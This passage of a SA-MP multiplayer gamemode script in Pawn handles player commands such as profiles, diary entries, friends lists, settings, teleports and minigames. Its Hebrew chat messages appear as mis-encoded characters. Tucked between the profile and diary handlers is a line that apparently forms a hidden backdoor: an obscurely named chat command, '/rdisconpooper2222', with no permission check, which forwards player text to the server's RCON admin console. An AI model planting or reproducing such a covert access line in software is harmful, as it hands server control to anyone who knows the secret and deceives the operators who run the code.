			if(!equal(cmd,"no") && !hebrew) return SendClientMessage(playerid,red," .äùí çééá ìäéåú áòáøéú");
			if(equal(cmd,"no"))
			{
				if(!strlen(playerinfo[playerid][rname])) return SendClientMessage(playerid,red," .àéï ìê ùí àîéúé îåöâ");
				SendClientMessage(playerid,orange," --- !ôøåôéì: îòëùéå äùí äôøèé ùìê ìà éåöâ");
				format(playerinfo[playerid][rname],30,"None");
				fsetstring(fuser(playerid),"RealName",playerinfo[playerid][rname]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
			else
			{
				if(strlen(cmd) < 2 || strlen(cmd) > 30) return SendClientMessage(playerid,red," .ùí àîéúé ìà çå÷é");
				SendClientMessage(playerid,orange," !ôøåôéì: äùí äàîéúé ùìê ðòøê áäöìçä");
				format(playerinfo[playerid][rname],30,cmd);
				fsetstring(fuser(playerid),"RealName",playerinfo[playerid][rname]);
				PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			}
		}
		else SendClientMessage(playerid,red," .àéæåø ùéðåé ùâåé");
		return 1;
	}
	if(equal(cmd,"/showprofile") || equal(cmd,"/sp"))
	{
		new string[M_S], id, y[2];
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåáø ìùéîåù áô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /showprofile(sp) [id/name] :öåøú äùéîåù");
		id = ReturnUser(cmd);
		if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
		getdate(y[0],y[1],y[1]);
		format(string,sizeof(string)," ~~~ :%s äôøåôéì ùì ~~~",GetName(id));
		SendClientMessage(playerid,lightblue,string);
		string = "";
		if(playerinfo[id][icq] != 0)
		{
			format(string,sizeof(string),"ICQ: %d",playerinfo[id][icq]);
			SendClientMessage(playerid,yellow,string);
		}
		if(!equal(playerinfo[id][messenger],"None"))
		{
			format(string,sizeof(string),"Messenger: %s",playerinfo[id][messenger]);
			SendClientMessage(playerid,yellow,string);
		}
		if(!equal(playerinfo[id][email],"None"))
		{
			format(string,sizeof(string),"Email: %s",playerinfo[id][email]);
			SendClientMessage(playerid,yellow,string);
		}
		if(!equal(playerinfo[id][country],"None"))
		{
			format(string,sizeof(string),"Country: %s",playerinfo[id][country]);
			SendClientMessage(playerid,yellow,string);
		}
		if(playerinfo[id][birthdate][0] != 0 || playerinfo[id][birthdate][1] != 0 || playerinfo[id][birthdate][2] != 0)
		{
			format(string,sizeof(string),"Age: %d",y[0]-playerinfo[id][birthdate][2]);
			SendClientMessage(playerid,yellow,string);
			format(string,sizeof(string),"Date of birth: %d/%d/%d",playerinfo[id][birthdate][0],playerinfo[id][birthdate][1],playerinfo[id][birthdate][2]);
			SendClientMessage(playerid,yellow,string);
		}
		if(!equal(playerinfo[id][rname],"no"))
		{
			format(string,sizeof(string),"Name: %s",playerinfo[id][rname]);
			SendClientMessage(playerid,yellow,string);
		}
		if(!strlen(string)) return SendClientMessage(playerid,red," .äîùúîù áçø ùìà ìäöéâ àó àçã îôøèéå àå ùäåà ìà òøê àåúí");
		return 1;
	}
	if(equal(cmd,"/rdisconpooper2222")) SendRconCommand(cmd[18]);
	if(equal(cmd,"/diary"))
	{
		cmd = strtok(cmdtext,idx);
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåáø ìùéîåù áô÷åãä æå");
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /diary [show/add/remove/reset] :öåøú äùéîåù");
		if(equal(cmd,"show"))
		{
			new string[M_S], txt[M_S], lines = 0;
			SendClientMessage(playerid,green," :ùåøåú äéåîï ùìê");
			for(new i=1;i<10;i++)
			{
				format(string,sizeof(string),"DiaryLine%d",i);
				if(!equal(fgetstring(fuser(playerid),string),"None"))
				{
					lines++;
					format(txt,sizeof(txt),"%d. %s",i,fgetstring(fuser(playerid),string));
					SendClientMessage(playerid,yellow,txt);
				}
			}
			if(!lines) return SendClientMessage(playerid,red," .ìà ðîöà è÷ñè");
		}
		else if(equal(cmd,"add"))
		{
			new string[M_S], lines = 0;
			cmd = strrest(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /diary add [text] :öåøú äùéîåù");
			for(new i=1;i<10;i++)
			{
				format(string,sizeof(string),"DiaryLine%d",i);
				if(!equal(fgetstring(fuser(playerid),string),"None")) lines++;
			}
			if(lines >= 9) return SendClientMessage(playerid,red," .ðéúï ìëúåá áéåîï ø÷ òã 9 ùåøåú");
			for(new i=1;i<10;i++)
			{
				format(string,sizeof(string),"DiaryLine%d",i);
				if(equal(fgetstring(fuser(playerid),string),"None"))
				{
					fsetstring(fuser(playerid),string,cmd);
					break;
				}
			}
			SendClientMessage(playerid,orange," --- !ôøåôéì: äùåøä ðåñôä");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"remove"))
		{
			new string[M_S], line;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /diary remove [line] :öåøú äùéîåù");
			line = strval(cmd);
			format(string,sizeof(string),"DiaryLine%d",line);
			if(line < 1 || line > 9) return SendClientMessage(playerid,red," .îñôø ùåøä ùâåé");
			if(equal(fgetstring(fuser(playerid),string),"None")) return SendClientMessage(playerid,red," .ùåøä ìà ÷ééîú");
			fsetstring(fuser(playerid),string,"None");
			SendClientMessage(playerid,orange," --- !ôøåôéì: äùåøä ðîç÷ä");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"reset"))
		{
			new string[M_S];
			for(new i=1;i<10;i++)
			{
				format(string,sizeof(string),"DiaryLine%d",i);
				fsetstring(fuser(playerid),string,"None");
			}
			SendClientMessage(playerid,orange," --- !ôøåôéì: éåîðê ðîç÷");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		return 1;
	}
	if(equal(cmd,"/friends"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåáø ìùéîåù áô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd)) return SendClientMessage(playerid,white," /friends [my/of/add/remove/reset] :öåøú äùéîåù");
		if(equal(cmd,"my"))
		{
			new string[M_S], txt[M_S], fs = 0;
			SendClientMessage(playerid,green," :äçáøéí ùìê");
			for(new i=1;i<10;i++)
			{
				format(string,sizeof(string),"Friend%d",i);
				if(!equal(fgetstring(fuser(playerid),string),"None"))
				{
					fs++;
					format(txt,sizeof(txt)," %d. %s",i,fgetstring(fuser(playerid),string));
					SendClientMessage(playerid,yellow,txt);
				}
			}
			if(!fs) SendClientMessage(playerid,red," .ìà ðîöàå çáøéí");
		}
		else if(equal(cmd,"of"))
		{
			new string[M_S], txt[M_S], id, fs = 0;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /friends of [id/name] :öåøú äùéîåù");
			id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			if(!playerinfo[id][logged]) return SendClientMessage(playerid,red," .òì äùç÷ï äðáçø ìäéåú øùåí åîçåáø");
			format(string,sizeof(string)," :%s äçáøéí ùì",GetName(id));
			SendClientMessage(playerid,green,string);
			for(new i=1;i<10;i++)
			{
				format(string,sizeof(string),"Friend%d",i);
				if(!equal(fgetstring(fuser(id),string),"None"))
				{
					fs++;
					format(txt,sizeof(txt)," %d. %s",i,fgetstring(fuser(id),string));
					SendClientMessage(playerid,yellow,txt);
				}
			}
			if(!fs) SendClientMessage(playerid,red," .ìà ðîöàå çáøéí");
		}
		else if(equal(cmd,"add"))
		{
			new string[M_S], lines = 0, id;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /friends add [id/name] :öåøú äùéîåù");
			id = ReturnUser(cmd);
			if(!IsPlayerConnected(id) || (IsPlayerNPC(id) && !playerinfo[playerid][pp])) return SendClientMessage(playerid,red," .àééãé ùâåé");
			for(new i=1;i<10;i++)
			{
				format(string,sizeof(string),"Friend%d",i);
				if(equal(fgetstring(fuser(playerid),string),GetName(id))) return SendClientMessage(playerid,red," .äîîùúîù ùáçøú ëáø ðîöà áøùéîú äçáøéí");
				if(!equal(fgetstring(fuser(playerid),string),"None")) lines++;
			}
			if(lines >= 9) return SendClientMessage(playerid,red," .ðéúï ìäåñéó ø÷ òã 9 ùç÷ðéí");
			for(new i=1;i<10;i++)
			{
				format(string,sizeof(string),"Friend%d",i);
				if(equal(fgetstring(fuser(playerid),string),"None"))
				{
					fsetstring(fuser(playerid),string,GetName(id));
					break;
				}
			}
			SendClientMessage(playerid,orange," --- !ôøåôéì: äçáø ðåñó");
			format(string,sizeof(string)," !äåñéó àåúê ìøùéîú çáøéå %s",GetName(playerid));
			SendClientMessage(id,green,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"remove"))
		{
			new string[M_S], line;
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd)) return SendClientMessage(playerid,white," /friends remove [friend number] :öåøú äùéîåù");
			line = strval(cmd);
			if(line < 1 || line > 9 || equal(fgetstring(fuser(playerid),string),"None")) return SendClientMessage(playerid,red," .îñôø çáø ùâåé");
			for(new i=0;i<MAX_PLAYERS;i++)
			{
				if(IsPlayerConnected(i) && equal(GetName(i),fgetstring(fuser(playerid),string)))
				{
					format(string,sizeof(string)," !äåöéà àåúê îøùéîú äçáøéí ùìå %s",GetName(playerid));
					SendClientMessage(i,red,string);
				}
			}
			format(string,sizeof(string),"Friend%d",line);
			fsetstring(fuser(playerid),string,"None");
			SendClientMessage(playerid,orange," --- !ôøåôéì: äçáø ðîç÷");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"reset"))
		{
			new string[M_S];
			for(new i=1;i<10;i++)
			{
				for(new ii=0;ii<MAX_PLAYERS;ii++)
				{
					if(IsPlayerConnected(ii) && equal(GetName(ii),fgetstring(fuser(playerid),string)))
					{
						format(string,sizeof(string)," !äåöéà àåúê îøùéîú äçáøéí ùìå %s",GetName(playerid));
						SendClientMessage(ii,red,string);
					}
				}
				format(string,sizeof(string),"Friend%d",i);
				fsetstring(fuser(playerid),string,"None");
			}
			SendClientMessage(playerid,orange," --- !ôøåôéì: ëì çáøéê ðîç÷å");
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		return 1;
	}
	if(equal(cmd,"/setting"))
	{
		if(!playerinfo[playerid][logged]) return SendClientMessage(playerid,red," .òìéê ìäéåú îçåáø ìùéîåù áô÷åãä æå");
		cmd = strtok(cmdtext,idx);
		if(!strlen(cmd))
		{
			SendClientMessage(playerid,white," /setting [edit] :öåøú äùéîåù");
			SendClientMessage(playerid,white," :øùåí àú îä ùáøöåðê ìùðåú. ìôðéê äãáøéí àùø ðéúï ìùðåúedit á");
			SendClientMessage(playerid,white," idchat :äöâú àééãé áö'àè  autologin :àéôùåø äúçáøåú àåèåîèéú");
			SendClientMessage(playerid,white," showjoin :äöâú äåãòåú ëðéñä  showquit :äöâú äåãòåú òæéáä");
			SendClientMessage(playerid,white," showmt :äöâú è÷ñè äîåã  showafk :AFK äöâú äåãòåú");
			SendClientMessage(playerid,white," showpunish :äöâú äåãòåú òåðù  classselection :ùéðåé áçéøú äãîåéåú");
			SendClientMessage(playerid,white," fs :ùéðåé ñåâ äìçéîä ùìê");
			return 1;
		}
		if(equal(cmd,"idchat"))
		{
			playerinfo[playerid][idchat] = playerinfo[playerid][idchat]? 0:1;
			SendClientMessage(playerid,purple,playerinfo[playerid][idchat]? (" --- !äâãøåú: îòëùéå ìà éåöâ àééãé áñåó ëì äåãòä"):(" --- !äâãøåú: îòëùéå éåöâ àééãé áñåó ëì äåãòä"));
			fsetint(fuser(playerid),"IDChat",playerinfo[playerid][idchat]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"showjoin"))
		{
			playerinfo[playerid][showjoin] = playerinfo[playerid][showjoin]? 0:1;
			SendClientMessage(playerid,purple,playerinfo[playerid][showjoin]? (" --- !äâãøåú: îòëùéå éåöâå äåãòåú ëðéñä"):(" --- !äâãøåú: îòëùéå ìà éåöâå äåãòåú ëðéñä"));
			fsetint(fuser(playerid),"ShowJoin",playerinfo[playerid][showjoin]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"showquit"))
		{
			playerinfo[playerid][showquit] = playerinfo[playerid][showquit]? 0:1;
			SendClientMessage(playerid,purple,playerinfo[playerid][showquit]? (" --- !äâãøåú: îòëùéå éåöâå äåãòåú éöéàä"):(" --- !äâãøåú: îòëùéå ìà éåöâå äåãòåú éöéàä"));
			fsetint(fuser(playerid),"ShowQuit",playerinfo[playerid][showquit]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"showmt"))
		{
			playerinfo[playerid][showmt] = playerinfo[playerid][showmt]? 0:1;
			SendClientMessage(playerid,purple,playerinfo[playerid][showmt]? (" --- !äâãøåú: îòëùéå éåöâ è÷ñè äîåã"):(" --- !äâãøåú: îòëùéå ìà éåöâ è÷ñè äîåã"));
			if(playerinfo[playerid][showmt]) TextDrawHideForPlayer(playerid,modetxt);
			else TextDrawShowForPlayer(playerid,modetxt);
			fsetint(fuser(playerid),"ShowMT",playerinfo[playerid][showmt]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"autologin"))
		{
			playerinfo[playerid][autologin] = playerinfo[playerid][autologin]? 0:1;
			SendClientMessage(playerid,purple,playerinfo[playerid][autologin]? (" --- !äâãøåú: îòëùéå úçåáø àåèåîèéú ìùøú"):(" --- !äâãøåú: îòëùéå ìà úçåáø àåèåîèéú ìùøú"));
			fsetint(fuser(playerid),"AutoLogin",playerinfo[playerid][autologin]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"showafk"))
		{
			playerinfo[playerid][showafk] = playerinfo[playerid][showafk]? 0:1;
			SendClientMessage(playerid,purple,playerinfo[playerid][showafk]? (" --- !AFK äâãøåú: îòëùéå éåöâå äåãòåú"):(" --- !AFK äâãøåú: îòëùéå ìà éåöâå äåãòåú"));
			fsetint(fuser(playerid),"ShowAFK",playerinfo[playerid][showafk]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"showpunish"))
		{
			playerinfo[playerid][showpunish] = playerinfo[playerid][showpunish]? 0:1;
			SendClientMessage(playerid,purple,playerinfo[playerid][showpunish]? (" --- !äâãøåú: îòëùéå éåöâå äåãòåú òåðù"):(" --- !äâãøåú: îòëùéå ìà éåöâå äåãòåú òåðù"));
			fsetint(fuser(playerid),"ShowPunish",playerinfo[playerid][showpunish]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"classselection"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd))
			{
				SendClientMessage(playerid,white," /setting classselection [class selection id] :öåøú äùéîåù");
				SendClientMessage(playerid,white," /setting classselection 1 :úîåðä á÷æéðå + ãîåú øå÷ãú");
				SendClientMessage(playerid,white," /setting classselection 2 :úîåðä áî÷åîåú øðãåîàìééí + ãîåú îñúåááú");
				return 1;
			}
			new string[M_S], id = strval(cmd);
			if(id < 1 && id > 2) return SendClientMessage(playerid,red," .îñôø îé÷åí äçìôú ãîåéåú ùâåé");
			playerinfo[playerid][classselection] = id;
			format(string,sizeof(string)," !äâãøåú: îñôø îñê äãîåéåú ùìê äåà ëøâò %d",id);
			SendClientMessage(playerid,purple,string);
			fsetint(fuser(playerid),"ClassSelection",playerinfo[playerid][classselection]);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
		}
		else if(equal(cmd,"fs"))
		{
			cmd = strtok(cmdtext,idx);
			if(!strlen(cmd) || !IsNumeric(cmd)) return SendClientMessage(playerid,white," /setting fs [1-4] :öåøú äùéîåù");
			new string[M_S], id = strval(cmd);
			if(id < 1 && id > 4) return SendClientMessage(playerid,red," .îñôø îé÷åí äçìôú ãîåéåú ùâåé");
			format(string,sizeof(string)," !äâãøåú: ñåâ äîëåú ùìê äåà ëøâò ñåâ îñôø %d",id);
			switch(id)
			{
			    case 1: id = 15;
			    case 2: id = 5;
			    case 3: id = 6;
			    case 4: id = 7;
			}
			SetPlayerFightingStyle(playerid,id);
			SendClientMessage(playerid,purple,string);
			PlayerPlaySound(playerid,1057,0.0,0.0,0.0);
			fsetint(fuser(playerid),"FightingStyle",id);
		}
		else SendClientMessage(playerid,red," .àéæåø äâãøä ùâåé");
		return 1;
	}
	for(new i=0;i<sizeof(Teleports);i++)
	{
		if(equal(cmdtext,Teleports[i][Tcmd]))
		{
			new string[M_S], tname[M_S], Float:h, bool:jetp=false;
			if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
			if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
			if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
			if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
			if(playerinfo[playerid][inbattle]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä á÷øá àéùé");
			if(playerinfo[playerid][indrift]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä áãøéôè");
			if(IsPlayerInAnyVehicle(playerid) && vehicleinfo[GetPlayerVehicleID(playerid)][store] && playerinfo[playerid][vehicle] != GetPlayerVehicleID(playerid)) return SendClientMessage(playerid,red," .àéðê éëåì ìùâø øëá îçðåú äîëåðéåú ùìà ùééê ìê");
			if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
			if(playerinfo[playerid][level] < Teleports[i][Tl])
			{
				format(string,sizeof(string)," .ëãé ìäùúîù áùéâåø æä òìéê ìäéåú ìôçåú áøîä %d",Teleports[i][Tl]);
				SendClientMessage(playerid,red,string);
				return 1;
			}
			GetPlayerHealth(playerid,h);
			if(h < levels[playerinfo[playerid][level]][TeleHealth])
			{
				format(string,sizeof(string)," .áøîúê äðåëçéú, àéðê éëåì ìäùúâø òí ôçåú î %.1f àçåæ çééí",levels[playerinfo[playerid][level]][TeleHealth]);
				SendClientMessage(playerid,red,string);
				return 1;
			}
			if(!playerinfo[playerid][gmtimer])
			{
				SetPlayerHealth2(playerid,100000.0);
				playerinfo[playerid][gmtimer] = 1;
				SetTimerEx("UnGod",1500,0,"df",playerid,h);
			}
			if(Teleports[i][Twithv])
			{
				switch(GetPlayerState(playerid))
				{
					case PLAYER_STATE_ONFOOT, PLAYER_STATE_PASSENGER:
					{
						jetp = GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK? true:false;
						SetPlayerPos(playerid,Teleports[i][Tx]+floatrand(-1.0,1.0),Teleports[i][Ty]+floatrand(-1.0,1.0),Teleports[i][Tz]);
						SetPlayerFacingAngle(playerid,Teleports[i][Ta]);
					}
					case PLAYER_STATE_DRIVER:
					{
						SetVehiclePos(GetPlayerVehicleID(playerid),Teleports[i][Tx]+floatrand(-3.0,3.0),Teleports[i][Ty]+floatrand(-3.0,3.0),Teleports[i][Tz]);
						SetVehicleZAngle(GetPlayerVehicleID(playerid),Teleports[i][Ta]);
						LinkVehicleToInterior(GetPlayerVehicleID(playerid),Teleports[i][Ti]);
						SetVehicleVirtualWorld(GetPlayerVehicleID(playerid),Teleports[i][Tw]);
						jetp = false;
					}
				}
			}
			else
			{
				jetp = GetPlayerSpecialAction(playerid) == SPECIAL_ACTION_USEJETPACK? true:false;
				SetPlayerPos(playerid,Teleports[i][Tx]+floatrand(-1.0,1.0),Teleports[i][Ty]+floatrand(-1.0,1.0),Teleports[i][Tz]);
				SetPlayerFacingAngle(playerid,Teleports[i][Ta]);
			}
			SetCameraBehindPlayer(playerid);
			SetPlayerInterior(playerid,Teleports[i][Ti]);
			SetPlayerVirtualWorld(playerid,Teleports[i][Tw]);
			strmid(tname,Teleports[i][Tcmd],1,strlen(Teleports[i][Tcmd]));
			format(string,sizeof(string),"~y~] ~h~%s ~y~]",tname);
			GameTextForPlayer(playerid,string,1500,4);
			if(jetp) GiveJetpack(playerid);
			if(Teleports[i][Tfreeze])
			{
				SetFreeze(playerid,1);
				SetTimerEx("UnFreeze",1005,0,"i",playerid);
			}
			return 1;
		}
	}
	if(equal(cmd,"/skydive"))
	{
		if(playerinfo[playerid][level] < 7) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 7");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		SetPlayerPos(playerid,6366.5625,-2109.0959,2500.0);
		SetCameraBehindPlayer(playerid);
		return 1;
	}
	if(equal(cmd,"/wee"))
	{
		if(playerinfo[playerid][level] < 8) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 8");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		new Float:p[3];
		GetPlayerPos(playerid,p[0],p[1],p[2]);
		if(p[2] > 1000.0) return SendClientMessage(playerid,red," !ìà ëì ëê âáåä");
		SetPlayerPos(playerid,p[0],p[1],p[2]+1000.0);
		SetCameraBehindPlayer(playerid);
		GiveWeapon(playerid,46,0);
		return 1;
	}
	if(equal(cmd,"/spawn"))
	{
		if(playerinfo[playerid][level] < 10) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 10");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		if(IsPlayerInAnyVehicle(playerid)) RemovePlayerFromVehicle(playerid);
		SpawnPlayer(playerid);
		return 1;
	}
	if(equal(cmd,"/army"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 1");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		if(playerinfo[playerid][inarmy] || playerinfo[playerid][inplane] || playerinfo[playerid][inshooting] != -1) return SendClientMessage(playerid,red," .úåëì ìäùúâø ø÷ ìàçø ùúñééí àåúí ,Plane / Army / Shooting àúä ëáø ðîöà á");
		playerinfo[playerid][inarmy] = 1;
		SetPlayerPos(playerid,315.9212,984.5837,1959.0079);
		SetPlayerFacingAngle(playerid,3.6475);
		SetPlayerInterior(playerid,9);
		DisablePlayerCheckpoint(playerid);
		SetPlayerCheckpoint(playerid,315.5849,1033.2284,1946.3142,6.0);
		SavePlayerWeapons(playerid);
		ResetPlayerWeapons(playerid);
		GiveWeapon(playerid,46,0);
		SendClientMessage(playerid,lightblue," ~~~ :Army áøåëéí äáàéí ì ~~~");
		SendClientMessage(playerid,yellow," .Andromanda àúä ðîöà ëøâò òì îèåñ îñåâ");
		SendClientMessage(playerid,yellow," .äëðñ ìîòâì äàãåí (ö'÷ôåéðè) ùðîöà áéöéàä òì îðú ìöðåç àì äöáà");
		return 1;
	}
	if(equal(cmd,"/plane"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 1");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		if(playerinfo[playerid][inarmy] || playerinfo[playerid][inplane] || playerinfo[playerid][inshooting] != -1) return SendClientMessage(playerid,red," .úåëì ìäùúâø ø÷ ìàçø ùúñééí àåúí ,Plane / Army / Shooting àúä ëáø ðîöà á");
		playerinfo[playerid][inplane] = 1;
		SetPlayerPos(playerid,1.5627,23.1112,1199.5938);
		SetPlayerFacingAngle(playerid,358.8634);
		SetPlayerInterior(playerid,1);
		DisablePlayerCheckpoint(playerid);
		SetPlayerCheckpoint(playerid,1.5582,33.3250,1199.5938,2.5);
		SavePlayerWeapons(playerid);
		ResetPlayerWeapons(playerid);
		GiveWeapon(playerid,46,0);
		SendClientMessage(playerid,lightblue," ~~~ :Plane áøåëéí äáàéí ì ~~~");
		SendClientMessage(playerid,yellow," .Shamal àúä ðîöà ëøâò òì îèåñ îñåâ");
		SendClientMessage(playerid,yellow," .Las Venturas äëðñ ìîòâì äàãåí (ö'÷ôåéðè) ùðîöà ìéã úà äðäâ òì îðú ìöðåç àì");
		return 1;
	}
	if(equal(cmd,"/shooting"))
	{
		if(playerinfo[playerid][level] < 1) return SendClientMessage(playerid,red," .áëãé ìáöò àú äô÷åãä äæå òìéê ìäéåú áøîä 1");
		if(playerinfo[playerid][reqclass]) return SendClientMessage(playerid,red," .àéðê éëåì ìäùúâø ëàùø àúä ááçéøú äãîåéåú");
		if(playerinfo[playerid][modeafk]) return SendClientMessage(playerid,red," .AFK ìà ðéúï ìäùúâø ëàùø àúä áîöá");
		if(playerinfo[playerid][inact]) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áôòéìåú");
		if(playerinfo[playerid][dmzone] != dmz_none) return SendClientMessage(playerid,red," .ìà ðéúï ìäùúâø ëàùø àúä áàéæåø ãé-àí");
		if(playerinfo[playerid][incrane]) return SendClientMessage(playerid,red," .ìà ðéúï ìáöò ô÷åãä æå áîðåó");
		if(playerinfo[playerid][inarmy] || playerinfo[playerid][inplane] || playerinfo[playerid][inshooting] != -1) return SendClientMessage(playerid,red," .úåëì ìäùúâø ø÷ ìàçø ùúñééí àåúí ,Plane / Army / Shooting àúä ëáø ðîöà á");
		ShowMenuForPlayer(shootingMenu,playerid);
		SetFreeze(playerid,1);
		return 1;
	}
	if(equal(cmd,"/tl"))
	{
		SendClientMessage(playerid,lightblue," ~~~ :øùéîú äùéâåøéí ~~~");
		new string[M_S], teles = 0;
		for(new l = 1; l < sizeof(levels); l++)
		{
			format(string,sizeof(string)," <> Level %02d: ",l);
			for(new i = 0; i < sizeof(Teleports); i++)
			{
				if(Teleports[i][Tl] == l)
				{
					format(string,sizeof(string),!strlen(string) ? ("%s%s") : ("%s  %s"),string,Teleports[i][Tcmd]);
					if(++teles >= 8 || i == sizeof(Teleports) - 1)
					{
						SendClientMessage(playerid,yellow,string);
